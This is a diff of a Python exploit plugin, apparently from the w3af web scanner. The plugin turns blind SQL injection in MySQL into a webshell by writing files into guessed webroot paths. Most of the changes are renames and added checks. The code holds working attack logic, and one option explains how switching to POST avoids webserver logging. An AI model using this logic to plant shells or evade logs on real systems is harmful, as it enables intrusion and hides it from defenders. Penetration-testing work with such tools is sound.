@@ -20,25 +20,27 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
 
-from core.data.fuzzer.fuzzer import *
+
 import core.controllers.outputManager as om
+
 # options
 from core.data.options.option import option
 from core.data.options.optionList import optionList
+
 from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
+from core.data.fuzzer.fuzzer import createRandAlpha, createRandAlNum
+import core.data.parsers.urlParser as urlParser
+from core.controllers.w3afException import w3afException
 
 import core.data.kb.knowledgeBase as kb
 import core.data.kb.vuln as vuln
-
-import core.data.parsers.urlParser as urlParser
-from core.controllers.w3afException import w3afException
-import os
-import urllib
 
 import plugins.attack.webshells.getShell as getShell
 from plugins.attack.db.dbDriverBuilder import dbDriverBuilder as dbDriverBuilder
 # TODO: It should be possible to perform these tasks with the time delay also!
 from core.controllers.sql_tools.blind_sqli_response_diff import blind_sqli_response_diff
+
+import urllib
 
 
 class mysqlWebShell(baseAttackPlugin):
@@ -56,11 +58,11 @@ class mysqlWebShell(baseAttackPlugin):
         self._url = ''
         self._method = ''
         self._data = ''
-        self._injvar = ''
-        self._changeToPost = True
-        self._equAlgorithm = 'stringEq'
-        self._equalLimit = 0.8
-        self._forceNotLocal = False
+        self._inj_var = ''
+        self._change_to_post = True
+        self._equ_algorithm = 'stringEq'
+        self._equal_limit = 0.8
+        self._force_not_local = False
         
     def fastExploit( self ):
         '''
@@ -72,7 +74,7 @@ class mysqlWebShell(baseAttackPlugin):
         v.setURL( self._url )
         v.setMethod( self._method )
         v.setDc( urlParser.getQueryString( 'http://a/a.txt?' + self._data ) )
-        v.setVar( self._injvar )
+        v.setVar( self._inj_var )
     
         self._generateShell( v )
         
@@ -120,24 +122,31 @@ class mysqlWebShell(baseAttackPlugin):
             # Create the blind sql handler
             self._bsql = blind_sqli_response_diff()
             self._bsql.setUrlOpener( self._urlOpener )
-            self._bsql.setEqualLimit( self._equalLimit )
-            self._bsql.setEquAlgorithm( self._equAlgorithm )
-            
-            vulns2 = []
-            for v in vulns:
-                vulns2.extend( self._bsql.is_injectable( v.getMutant().getFuzzableReq(), v.getVar() ) )
-            vulns = vulns2
+            self._bsql.setEqualLimit( self._equal_limit )
+            self._bsql.setEquAlgorithm( self._equ_algorithm )
             
             for vuln in vulns:
-                # Try to get a shell using all vuln
-                om.out.information('Trying to exploit using vulnerability with id: ' + str( vuln.getId() ) )
-                if self._generateShell(vuln):
-                    # A shell was generated, I only need one point of exec.
-                    om.out.information( '[Blind] sql vulnerability successfully exploited. You may start entering commands.' )
-                    kb.kb.append( self, 'shell', vuln )
-                    return True
+                # Verify
+                vuln_obj = self._bsql.is_injectable( vuln.getMutant().getFuzzableReq(),
+                                                                     vuln.getVar() )
+                if not vuln_obj:
+                    om.out.debug('Could not verify SQL injection ' + str(vuln) )
                 else:
-                    om.out.information('Failed to exploit using vulnerability with id: ' + str( vuln.getId() ) )
+                    om.out.console('SQL injection could be verified, trying to create the DB driver.')            
+                    
+                    # Try to get a shell using all vuln
+                    msg = 'Trying to exploit using vulnerability with id: ' + str( vuln.getId() )
+                    om.out.information( msg )
+                    if self._generateShell( vuln ):
+                        # A shell was generated, I only need one point of exec.
+                        msg = '[Blind] SQL vulnerability successfully exploited. You may start'
+                        msg += ' entering commands.'
+                        om.out.information( msg )
+                        kb.kb.append( self, 'shell', vuln )
+                        return True
+                    else:
+                        msg = 'Failed to exploit using vulnerability with id: ' + str(vuln.getId())
+                        om.out.information( msg )
         return False
                 
     def _generateShell( self, vuln ):
@@ -159,7 +168,7 @@ class mysqlWebShell(baseAttackPlugin):
             currentUser = self._driver.getCurrentUser()
             if not currentUser.upper().endswith( 'LOCALHOST' ):
                 om.out.information('The web application and the database seem to be in different hosts. If you want to continue this exploit anyway, set the forceNotLocal setting to True and run again.')
-                if not self._forceNotLocal:
+                if not self._force_not_local:
                     return False
                 else:
                     om.out.information('The web application and the database seem to be in different hosts. Continuing by user request.')
@@ -186,8 +195,13 @@ class mysqlWebShell(baseAttackPlugin):
         baseUrl = urlParser.baseUrl( vuln.getURL() )
         
         for webroot, path in self._getRemotePaths( vuln ):
-            om.out.debug('Testing if mysql has privileges to create file: '+ path + filename )
-            self._driver.writeFile( path + filename , fakeContent )
+            om.out.debug('Testing if MySQL has privileges to create file: '+ path + filename )
+            # Test and return if false.
+            try:
+                self._driver.writeFile( path + filename , fakeContent )
+            except Exception, e:
+                om.out.error( str(e) )
+                return False
             
             # Now we verify if the file is there!
             outFilePath = path.replace( webroot, baseUrl )
@@ -252,16 +266,16 @@ class mysqlWebShell(baseAttackPlugin):
         urlList = kb.kb.getData( 'urls', 'urlList' )
         paths = [ '/'.join( urlParser.getPath( x ).split('/')[:-1] )+'/' for x in urlList ]
         
-        pathSep = '/'
-        if webroot[0]!='/':
-            pathSep = '\\'
+        path_sep = '/'
+        if webroot[0] !='/':
+            path_sep = '\\'
         
         res = []
         for path in paths:
             # I need to get the path
-            completePath = webroot + path.replace('/', pathSep)
-            completePath = completePath.replace( pathSep+pathSep , pathSep )
-            res.append( (webroot, completePath ) )
+            complete_path = webroot + path.replace('/', path_sep)
+            complete_path = complete_path.replace( path_sep+path_sep , path_sep )
+            res.append( (webroot, complete_path ) )
             
         return res
         
@@ -272,7 +286,7 @@ class mysqlWebShell(baseAttackPlugin):
         res = []
         
         domain = urlParser.getDomain( vuln.getURL() )
-        rootDomain = urlParser.getRootDomain( vuln.getURL() )
+        root_domain = urlParser.getRootDomain( vuln.getURL() )
         
         res.append('/var/www/')
         res.append('/var/www/html/')
@@ -283,11 +297,11 @@ class mysqlWebShell(baseAttackPlugin):
         res.append( '/home/' + domain + '/html/' )
         res.append( '/home/' + domain + '/htdocs/' )
         
-        if domain != rootDomain:
-            res.append( '/home/' + rootDomain )
-            res.append( '/home/' + rootDomain + '/www/' )
-            res.append( '/home/' + rootDomain + '/html/' )
-            res.append( '/home/' + rootDomain + '/htdocs/' )
+        if domain != root_domain:
+            res.append( '/home/' + root_domain )
+            res.append( '/home/' + root_domain + '/www/' )
+            res.append( '/home/' + root_domain + '/html/' )
+            res.append( '/home/' + root_domain + '/htdocs/' )
         
         return res
         
@@ -317,23 +331,23 @@ class mysqlWebShell(baseAttackPlugin):
         o3 = option('data', self._data, d3, 'string')
 
         d4 = 'Variable where to inject with fastExploit()'
-        o4 = option('injvar', self._injvar, d4, 'string')
+        o4 = option('injvar', self._inj_var, d4, 'string')
 
         d5 = 'The algorithm to use in the comparison of true and false response for blind sql.'
         h5 = 'The options are: "stringEq" and "setIntersection". Read the user documentation for details.'
-        o5 = option('equAlgorithm', self._equAlgorithm, d5, 'string', help=h5)
+        o5 = option('equAlgorithm', self._equ_algorithm, d5, 'string', help=h5)
 
         d6 = 'Set the equal limit variable'
         h6 = 'Two pages are equal if they match in more than equalLimit. Only used when equAlgorithm is set to setIntersection.'
-        o6 = option('equalLimit', self._equalLimit, d6, 'float')
+        o6 = option('equalLimit', self._equal_limit, d6, 'float', help=h6)
         
         d7 = 'If the vulnerability was found in a GET request, try to change the method to POST during exploitation.'
         h7 = 'If the vulnerability was found in a GET request, try to change the method to POST during exploitation; this is usefull for not being logged in the webserver logs.'
-        o7 = option('changeToPost', self._changeToPost, d7, 'boolean', help=h7)
+        o7 = option('changeToPost', self._change_to_post, d7, 'boolean', help=h7)
         
         d8 = 'True if you want to try to exploit this vulnerability even if the database and the web application are in different hosts.'
         h8 = 'When the web application and the database seem to be in different hosts, and you still want to exploit, set the forceNotLocal setting to True and run again.'
-        o8 = option('forceNotLocal', self._forceNotLocal, d8, 'boolean', help=h8)
+        o8 = option('forceNotLocal', self._force_not_local, d8, 'boolean', help=h8)
         
         ol = optionList()
         ol.add(o1)
@@ -357,11 +371,11 @@ class mysqlWebShell(baseAttackPlugin):
         self._url = urlParser.uri2url( optionsMap['url'].getValue() )
         self._method = optionsMap['method'].getValue()
         self._data = optionsMap['data'].getValue()
-        self._injvar = optionsMap['injvar'].getValue()
-        self._equAlgorithm = optionsMap['equAlgorithm'].getValue()
-        self._equalLimit = optionsMap['equalLimit'].getValue()
-        self._forceNotLocal = optionsMap['forceNotLocal'].getValue()
-        self._changeToPost = optionsMap['changeToPost'].getValue()
+        self._inj_var = optionsMap['injvar'].getValue()
+        self._equ_algorithm = optionsMap['equAlgorithm'].getValue()
+        self._equal_limit = optionsMap['equalLimit'].getValue()
+        self._force_not_local = optionsMap['forceNotLocal'].getValue()
+        self._change_to_post = optionsMap['changeToPost'].getValue()
 
     def getPluginDeps( self ):
         '''
